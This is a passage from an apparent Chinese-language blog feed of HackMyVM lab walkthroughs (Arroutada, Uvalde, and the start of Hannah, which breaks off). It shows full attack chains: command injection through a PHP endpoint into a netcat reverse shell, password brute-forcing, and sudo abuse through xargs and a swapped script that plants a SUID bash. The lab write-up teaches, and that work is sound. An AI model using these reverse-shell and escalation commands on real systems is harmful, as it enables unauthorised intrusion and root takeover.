lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Jan  8  2023 srv
dr-xr-xr-x  13 root root     0 Feb  8 03:46 sys
drwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  14 root root  4096 Jan  8  2023 usr
drwxr-xr-x  12 root root  4096 Jan  8  2023 var
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@arroutada:/$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
www-data@arroutada:/$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@arroutada:/$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        4096                                           127.0.0.1:8000                                            0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*             
```

Êúâ‰∏™8000Á´ØÂè£Ê≤°ÊúâÂÖ¨ÂºÄÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶ÅËΩ¨ÂèëÔºå‰ΩÜÊòØÂÆÉsocatÂ∞ë‰∫ÜsoÔºåÈÇ£Êàë‰ª¨Áõ¥Êé•ÊâæÂÖ∂‰ªñÁöÑÂ∑•ÂÖ∑Âêß

```
www-data@arroutada:/tmp$ curl http://127.0.0.1:5000
bash: curl: command not found
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
--2025-02-08 04:00:55--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================&gt;]     319  --.-KB/s    in 0s    

2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]

www-data@arroutada:/tmp$ ls -la
total 476
drwxrwxrwt  2 root     root       4096 Feb  8 04:00 .
drwxr-xr-x 18 root     root       4096 Jan  8  2023 ..
-rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html
-rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat
www-data@arroutada:/tmp$ cat index.html 
&lt;h1&gt;Service under maintenance&lt;/h1&gt;


&lt;br&gt;


&lt;h6&gt;This site is from ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.+++++++++++..&lt;&lt;++.&gt;++.&gt;-----------.++.++++++++.&lt;+++++.&gt;++++++++++++++.&lt;+++++++++.---------.&lt;.&gt;&gt;-----------------.-------.++.++++++++.------.+++++++++++++.+.&lt;&lt;+..&lt;/h6&gt;

&lt;!-- Please sanitize /priv.php --&gt;
```

![image-20250331185429009](https://7r1umphk.github.io/image/20250331185429071.png)

ÈÇ£Êàë‰ª¨ÁúãÂÆÉÊèêÁ§∫ÁöÑ/priv.php

```
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
--2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                                                       [&lt;=&gt;                                                                    priv.php                                                       [ &lt;=&gt;                                                                                                                                     ]     308  --.-KB/s    in 0s    

2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]

www-data@arroutada:/tmp$ cat priv.php 
Error: the 'command' parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the 'command' parameter is not specified in the request body.';
}

*/
```

ËØ¥Êàë‰ª¨Â∞ë‰∫ÜÂèÇÊï∞ÔºåÊàë‰ª¨Âä†‰∏äÂ∞±Â•Ω‰∫Ü

```
www-data@arroutada:/tmp$ wget --post-data='{'command':'whoami'}' http://127.0.0.1:8000/priv.php -q -O -
drito


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the 'command' parameter is not specified in the request body.';
}

*/
```

Âà©Áî®

```
www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
id
uid=1001(drito) gid=1001(drito) groups=1001(drito)
```

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

ÊèêÊùÉ

```
drito@arroutada:~/web$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

https://gtfobins.github.io/gtfobins/xargs/#sudo

```bash
drito@arroutada:~/web$ sudo xargs -a /dev/null bash
root@arroutada:/home/drito/web# id
uid=0(root) gid=0(root) groups=0(root)
```

&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Arroutada.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_uvalde</title><link>https://7r1UMPHK.github.io/post/hmv_uvalde.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Uvalde
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.149
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:15 CST
Nmap scan report for 192.168.205.149
Host is up (0.00022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.205.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Agency - Start Bootstrap Theme
MAC Address: 08:00:27:79:3A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.205.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
```

# 2.Ë∏©ÁÇπ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ftp 192.168.205.149                          
Connected to 192.168.205.149.
220 (vsFTPd 3.0.3)
Name (192.168.205.149:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -al
229 Entering Extended Passive Mode (|||61334|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28  2023 .
drwxr-xr-x    2 0        116          4096 Jan 28  2023 ..
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp&gt; mget output
mget output [anpqy?]? y
229 Entering Extended Passive Mode (|||41326|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |*****************************************************************************************|  5154        9.15 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (4.77 MiB/s)
ftp&gt; exit
221 Goodbye.
                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ file output 
output: Unicode text, UTF-8 text, with very long lines (328), with CRLF, CR, LF line terminators, with escape sequences, with overstriking
           
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat output  
Script d√©marr√© sur 2023-01-28 19:54:05+01:00 [TERM='xterm-256color' TTY='/dev/pts/0' COLUMNS='105' LINES='25']
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -&gt; /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                              
 ‚ñÑ‚ñÑ                            ‚ñÑ‚ñÑ                                             
 ‚ñà‚ñà                            ‚ñà‚ñà                                             
 ‚ñà‚ñà‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ  ‚ñà‚ñà ‚ñÑ‚ñà‚ñà‚ñÄ   ‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñà‚ñà‚ñÑ  ‚ñÄ‚ñà‚ñà  ‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñÑ  ‚ñÑ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñà‚ñà‚ñÑ 
 ‚ñà‚ñà‚ñÄ   ‚ñà‚ñà   ‚ñÄ ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà  ‚ñà‚ñà‚ñÄ    ‚ñÄ  ‚ñà‚ñà‚ñÑ‚ñà‚ñà     ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà‚ñÑ ‚ñà‚ñà    ‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà 
 ‚ñà‚ñà    ‚ñà‚ñà  ‚ñÑ‚ñà‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñà  ‚ñà‚ñà        ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñÑ    ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñÄ    ‚ñÄ‚ñà‚ñÑ‚ñÑ‚ñà‚ñÄ   ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà 
 ‚ñà‚ñà    ‚ñà‚ñà  ‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà  ‚ñÄ‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà  ‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ   ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà     ‚ñà‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà 
 ‚ñÄ‚ñÄ    ‚ñÄ‚ñÄ   ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ    ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ   ‚ñÄ‚ñÄ   ‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ     ‚ñà‚ñà        ‚ñÄ‚ñÄ     ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ 
                                                    ‚ñà‚ñà‚ñà                       
                                                                              
                                                                              
                                                                              
                                                                              
            ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñà‚ñà    ‚ñà‚ñà                                                 
           ‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà  ‚ñà‚ñà    ‚ñà‚ñà                                                 
           ‚ñà‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  ‚ñà‚ñà    ‚ñà‚ñà                                                 
    ‚ñà‚ñà     ‚ñÄ‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà  ‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà                                                 
    ‚ñÄ‚ñÄ       ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ    ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ                                                 
                                                                              
                                                                              
matthew@debian:~$ exit
exit

Script termin√© sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE='0']
                                                                         
```

ÊöÇÊó∂Ê≤°Âï•‰ΩúÁî®ÔºåÁªßÁª≠Ë∏©ÁÇπ„ÄÇÈ°µÈù¢ÊòØÈùôÊÄÅÁöÑÔºåÁúã‰∏Ä‰∏ãÊúâÊ≤°Êúâ‰ªÄ‰πàÊòéÊòæÊºèÊ¥û

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nuclei -u http://192.168.205.149             

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7654
[INF] Executing 7274 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1693 (Reduced 1591 Requests)
[INF] Using Interactsh Server: oast.live
[missing-sri] [http] [info] http://192.168.205.149 ['https://fonts.googleapis.com/css?family=Montserrat:400,700','https://fonts.googleapis.com/css?family=Kaushan+Script','https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic,700italic','https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700']                                                                              
[waf-detect:apachegeneric] [http] [info] http://192.168.205.149
[openssh-detect] [tcp] [info] 192.168.205.149:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1']
[ssh-server-enumeration] [javascript] [info] 192.168.205.149:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1']
[ssh-auth-methods] [javascript] [info] 192.168.205.149:22 ['['publickey','password']']
[ssh-password-auth] [javascript] [info] 192.168.205.149:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.149:22
[CVE-2023-48795] [javascript] [medium] 192.168.205.149:22 ['Vulnerable to Terrapin']
[ftp-anonymous-login] [tcp] [medium] 192.168.205.149:21
[tech-detect:font-awesome] [http] [info] http://192.168.205.149
[tech-detect:bootstrap] [http] [info] http://192.168.205.149
[tech-detect:google-font-api] [http] [info] http://192.168.205.149
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.149
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.149
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.149
[form-detection] [http] [info] http://192.168.205.149
[apache-detect] [http] [info] http://192.168.205.149 ['Apache/2.4.54 (Debian)']
[package-json] [http] [info] http://192.168.205.149/package.json
[package-json] [http] [info] http://192.168.205.149/package-lock.json
                                             
```

Ê≤°ÁúãÂà∞Âï•ÔºåÈÇ£Êàë‰ª¨ÂéªÁàÜÁ†¥ÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.149 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.149
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1022]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.149/js/]
/index.php            (Status: 200) [Size: 29604]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.149/css/]
/user.php             (Status: 302) [Size: 0] [--&gt; login.php]
/img                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.149/img/]
/create_account.php   (Status: 200) [Size: 1003]
/mail                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.149/mail/]
/.                    (Status: 200) [Size: 29604]
/success.php          (Status: 302) [Size: 0] [--&gt; login.php]
/vendor               (Status: 301) [Size: 319] [--&gt; http://192.168.205.149/vendor/]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
                                                                 
```

Êúâ‰∏Ä‰∏™Ê≥®ÂÜå/create_account.phpÔºåÊàë‰ª¨Â∞ùËØïÊ≥®ÂÜå

![image-20250331190202777](https://7r1umphk.github.io/image/20250331190202831.png)

ÂêéÈù¢ÈÇ£‰∏Ä‰∏≤ÊúâÁÇπÂÉè64,Êàë‰ª¨ÊãøËµ∑Ëß£ÂØÜÁúãÁúã

![](https://7r1umphk.github.io/image/20250331190202831.png)

ÂèØ‰ª•ÁúãÂà∞ÂÆÉÁöÑÂØÜÁ†ÅÊ†ºÂºèÊòØ‰ª•Áî®Êà∑Âêç+Ê≥®ÂÜåÂπ¥+@+ÈöèÊú∫4‰ΩçÊï∞ÔºåÈÇ£Êàë‰ª¨ÁîüÊàêÂ≠óÂÖ∏ÁàÜÁ†¥‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ for i in $(seq -w 0 9999); do echo 'matthew2023@$i' ;done &gt; pass
```

ÊâìÂºÄÊàë‰ª¨ÁöÑburp

![image-20250331190214441](https://7r1umphk.github.io/image/20250331190214521.png)

![image-20250331190219774](https://7r1umphk.github.io/image/20250331190219855.png)

421ÈïøÂ∫¶ÊòéÊòæ‰∏ç‰∏ÄÊ†∑ÔºåÊàë‰ª¨‰ΩøÁî®Ëøô‰∏™ÂØÜÁ†ÅÊµãËØïÁôªÂΩï

![image-20250331190225481](https://7r1umphk.github.io/image/20250331190225550.png)

Êàë‰ª¨ÂÖàÂ∞ùËØïÂèØ‰∏çÂèØ‰ª•sshÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh matthew@192.168.205.149
The authenticity of host '192.168.205.149 (192.168.205.149)' can't be established.
ED25519 key fingerprint is SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.149' (ED25519) to the list of known hosts.
matthew@192.168.205.149's password: 
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
matthew@uvalde:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

# 3.ÊèêÊùÉ

```
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ ls -la /opt/
total 12
drwx---rwx  2 root root 4096 Feb  5  2023 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack
matthew@uvalde:~$ cat /opt/superhack 
#! /bin/bash 
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat &lt;&lt; EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf '${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n'
printf '${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n'
printf '${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n'

printf '\n'

[[ $# -ne 0 ]] &amp;&amp; echo -e '${BLEU}Usage:${RESET} $0 domain' &amp;&amp; exit

while [ -z '$domain' ]; do
read -p '${VERT}domain to hack:${RESET} ' domain
done

printf '\n'

n=50

string=''
for ((i=0; i&lt;$n; i++))
do
string+='.'
done

for ((i=0; i&lt;$n; i++))
do
string='${string/./#}'
printf '${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r'
sleep .09
done

printf '\n'
printf '${JAUNE}Target $domain ====&gt; PWNED${RESET}\n'
printf '${JAUNE}URL: https://$domain/*********************.php${RESET}\n'

echo -e '\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n'
```

Êàë‰ª¨ÂèØ‰ª•‰øÆÊîπÂΩìÂâçÁõÆÂΩïÔºå‰ΩøÁî®ÊääËÑöÊú¨Êç¢‰∏Ä‰∏ãÂ∞±Â•Ω‰∫Ü

```
matthew@uvalde:/opt$ mv superhack superhack1
matthew@uvalde:/opt$ ls -la
total 12
drwx---rwx  2 root root 4096 Feb  8 02:37 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack1
matthew@uvalde:/opt$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; superhack
matthew@uvalde:/opt$ ls -al
total 16
drwx---rwx  2 root    root    4096 Feb  8 02:38 .
drwxr-xr-x 18 root    root    4096 Jan 22  2023 ..
-rw-r--r--  1 matthew matthew   39 Feb  8 02:38 superhack
-rw-r--r--  1 root    root    1594 Jan 31  2023 superhack1
matthew@uvalde:/opt$ ls -la /tmp/
total 40
drwxrwxrwt 10 root root 4096 Feb  8 02:29 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .font-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .ICE-unix
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .Test-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .X11-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .XIM-unix
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
matthew@uvalde:/opt$ ls -la /tmp/
total 1248
drwxrwxrwt 10 root root    4096 Feb  8 02:39 .
drwxr-xr-x 18 root root    4096 Jan 22  2023 ..
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .font-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .ICE-unix
-rwsr-xr-x  1 root root 1234376 Feb  8 02:39 sh
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .Test-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .X11-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .XIM-unix
matthew@uvalde:/opt$ /tmp/sh -p
sh-5.1# id
uid=1000(matthew) gid=1000(matthew) euid=0(root) groups=1000(matthew)
```

&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_uvalde.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_hannah</title><link>https://7r1UMPHK.github.io/post/hmv_hannah.html</link><description># hmv_hannah

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Hannah  
**ÈöæÂ∫¶**ÔºöÁªøËâ≤  
**ÁõÆÊ†á IP**Ôºö192.168.205.150  
**Êú¨Êú∫ IP**Ôºö192.168.205.128

# 1.Êâ´Êèè

‚Äã`nmap`‚ÄãËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.150
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST
Nmap scan report for 192.168.205.150
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
